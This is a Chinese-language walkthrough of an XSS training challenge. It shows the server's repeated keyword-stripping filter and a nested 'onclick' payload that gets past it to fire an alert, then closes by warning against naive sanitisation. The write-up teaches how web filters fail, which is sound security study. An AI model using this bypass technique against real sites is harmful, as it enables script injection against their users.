#  Cross Site Scripting 3(跨站脚本 (XSS)3)

## 题介绍

是一个xss注入点，并且进行了一些过滤  

## 功能实现 
请求数据包  
```
POST /challenges/ad2628bcc79bf10dd54ee62de148ab44b7bd028009a908ce3f1b4d019886d0e HTTP/1.1

searchTerm=dddd&csrfToken=12870305622844378894711308558778749381
```

在上一级挑战基础上增加了一层过滤 XssFilter.levelThree
```
if(Validate.validateTokens(tokenCookie, tokenParmeter))
{
	String searchTerm = request.getParameter("searchTerm");
	log.debug("User Submitted - " + searchTerm);
	searchTerm = XssFilter.levelThree(searchTerm);
	log.debug("After Filtering - " + searchTerm);
	String htmlOutput = new String();
	if(FindXSS.search(searchTerm))
	{
		htmlOutput = "<h2 class='title'>" + bundle.getString("result.wellDone") + "</h2>" +
				"<p>" + bundle.getString("result.youDidIt") + "<br />" +
				bundle.getString("result.resultKey") + " <a>" +
					Hash.generateUserSolution(
							Getter.getModuleResultFromHash(getServletContext().getRealPath(""), levelHash
							), (String)ses.getAttribute("userName")
					)
				 +
				"</a>";
	}

对应实现代码  
public static String levelThree (String input)
{
	log.debug("Filtering input at XSS levelThree");
	input = input.toLowerCase();
	input = input.replaceAll("script", "scr.pt");
	for(int h = 0; h < FindXSS.javascriptTriggers.length; h++)
	{
		for(int i = 0; i <= 3; i++)  //一共替换4次 
			input = input.replaceAll(FindXSS.javascriptTriggers[h], ""); //替换为空 
	}
	return screwHtmlEncodings(input);
}
	
private static String screwHtmlEncodings(String input)
{
	input = input.replaceAll("&", "!").replaceAll(":", "!");
	return input;
}
```
从递归实现看，只会替换4次 

## 解题步骤  

提供5次攻击代码即可 
```
<input type="button" oncliconcliconcliconcliconclickkkkk="alert('XSS')"/>
```

## 总结  

不安全的过滤方式非常危险，尽可能不要净化用户输入，当检测到异常时，直接拒绝请求可能会更安全